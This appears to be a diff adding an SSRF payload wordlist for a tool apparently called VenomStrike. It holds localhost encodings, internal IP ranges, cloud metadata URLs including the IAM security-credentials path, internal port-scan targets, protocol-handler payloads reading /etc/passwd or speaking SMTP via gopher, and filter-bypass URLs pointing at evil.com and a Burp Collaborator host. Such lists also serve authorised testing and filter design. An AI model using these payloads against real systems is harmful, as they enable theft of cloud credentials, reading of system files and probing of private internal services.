@@ -1,0 +1,60 @@
+# VenomStrike SSRF Payloads
+# Localhost variants
+http://127.0.0.1
+http://localhost
+http://[::1]
+http://0.0.0.0
+http://0x7f000001
+http://2130706433
+http://017700000001
+http://127.1
+http://127.0.1
+http://0
+
+# Internal network ranges
+http://10.0.0.1
+http://172.16.0.1
+http://192.168.0.1
+http://192.168.1.1
+
+# Cloud metadata endpoints
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/meta-data/instance-id
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+http://metadata.google.internal/computeMetadata/v1/instance/hostname
+http://169.254.169.254/metadata/v1/
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+
+# Port scanning via SSRF
+http://127.0.0.1:22
+http://127.0.0.1:80
+http://127.0.0.1:443
+http://127.0.0.1:3306
+http://127.0.0.1:5432
+http://127.0.0.1:6379
+http://127.0.0.1:8080
+http://127.0.0.1:8443
+http://127.0.0.1:9200
+http://127.0.0.1:27017
+http://127.0.0.1:11211
+
+# Protocol handlers
+file:///etc/passwd
+file:///c:/windows/win.ini
+dict://127.0.0.1:11211/info
+gopher://127.0.0.1:25/_EHLO%20evil.com
+ftp://127.0.0.1
+
+# Bypass techniques
+http://127.0.0.1.nip.io
+http://spoofed.burpcollaborator.net
+http://localtest.me
+http://127.0.0.1%2523@evil.com
+http://evil.com%23@127.0.0.1
+http://127.0.0.1:80%40evil.com
+http://127.0.0.1%00@evil.com
